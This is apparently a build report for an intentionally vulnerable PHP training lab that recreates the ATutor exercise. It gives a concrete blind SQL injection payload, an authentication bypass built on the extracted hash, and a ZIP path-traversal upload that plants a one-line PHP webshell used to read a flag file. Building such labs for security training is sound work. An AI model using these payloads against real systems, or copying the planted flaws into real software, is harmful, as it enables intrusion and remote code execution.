# lab-78-quartzite — ATutor Auth Bypass and RCE

## Frame

**Outcome:** Working L5 PHP lab implementing the OSWE ATutor lesson. Students discover a blind boolean SQLi in an unauthenticated search endpoint ($addslashes resolves to trim()), extract a password hash, bypass authentication via token-controlled SHA1 comparison, then achieve RCE by uploading a ZIP with directory traversal and a .phtml extension that bypasses the extension blocklist.

**Success line:** validate_labs.sh 0 FAIL; smoke_test.sh PASS; blind SQLi TRUE/FALSE signal works; auth bypass with extracted hash logs in and reveals FLAG_LOCAL; ZIP traversal + .phtml upload leaves webshell at /mods/poc/cmd.phtml; `?cmd=cat /flag_proof.txt` returns FLAG_PROOF.

**Kill line:** ZipArchive missing (php7.4-zip not installed) or xml_parser_create missing (php7.4-xml not installed) breaks the upload chain.

**Proof:** 72/72 validate_labs.sh PASS; smoke_test.sh PASS; all three attack stages verified end-to-end.

---

## Work

### Application: Academy Learning Platform

PHP 7.4 + Apache + MariaDB in a single Ubuntu 20.04 container.

**Key files:**
- `www/include/mysql_connect.inc.php` — DB + $addslashes logic: `get_magic_quotes_gpc()` is off, `mysqli_connect` exists → `MYSQLI_ENABLED` defined → `$addslashes = 'trim'`; `queryDB()` uses `create_sql()` which sanitizes params array but the SQLi passes user input via string concatenation, not the array
- `www/mods/_standard/social/index_public.php?q=` — unauthenticated blind SQLi; input split on spaces, each piece inserted into LIKE clause
- `www/mods/_standard/social/lib/friends.inc.php` — `searchFriends()`: builds `(first_name LIKE '%piece%' OR ...) AND` from each space-delimited token
- `www/login.php` — token set via POST; auth query: `SHA1(CONCAT(password, token)) = form_password_hidden`
- `www/mods/_standard/tests/import_test.php` — ZipArchive extraction with extension blocklist callback, then XML validation that dies on malformed XML (leaving files on disk); no path normalization = zip slip to `/var/www/html/mods/`
- `www/mods/_core/file_manager/filemanager.inc.php` — blocklist: exe|asp|php|php3|... — `.phtml` not blocked

**Attack flow:**
1. Blind SQLi at `?q=AAAA')/**/or/**/(ascii(substring((select/**/password/**/from/**/AT_members/**/where/**/login='teacher'),N,1)))=ASCII%23` — TRUE gives Content-Length ~82, FALSE gives 0
2. Extract 40-char SHA1 hash byte by byte
3. POST to /login.php with `token=hax`, `form_password_hidden=sha1(extracted_hash + 'hax')` → authenticated, FLAG_LOCAL on dashboard
4. Upload ZIP with entry `../../../../var/www/html/mods/poc/cmd.phtml` containing `<?php echo shell_exec($_GET["cmd"]); ?>` + `imsmanifest.xml` = `invalid xml!` → XML parse dies → .phtml persists
5. `GET /mods/poc/cmd.phtml?cmd=cat+/flag_proof.txt` → FLAG_PROOF

**Build issues fixed:**
- `service mariadb` → `service mysql` (Ubuntu 20.04 service name)
- Added `php7.4-zip` (ZipArchive class), `php7.4-xml` (xml_parser_create)
- `/var/www/html/mods` chmod 777 must come AFTER COPY (not before)
- DB user: appuser@127.0.0.1 (root uses unix_socket plugin, inaccessible to www-data)

---

## Audit

- validate_labs.sh: 72/72 PASS
- smoke_test.sh: PASS
- Blind SQLi TRUE/FALSE: TRUE=82 bytes, FALSE=0 bytes ✓
- Auth bypass: sha1(hash + 'hax') → 200 + FLAG_LOCAL visible ✓
- ZIP traversal + .phtml: `XML error: Not well-formed` response, webshell at /mods/poc/cmd.phtml ✓
- FLAG_PROOF via `?cmd=cat /flag_proof.txt`: ARENA{test_proof} ✓

**Confidence:** High. All three attack stages verified with live flag values.
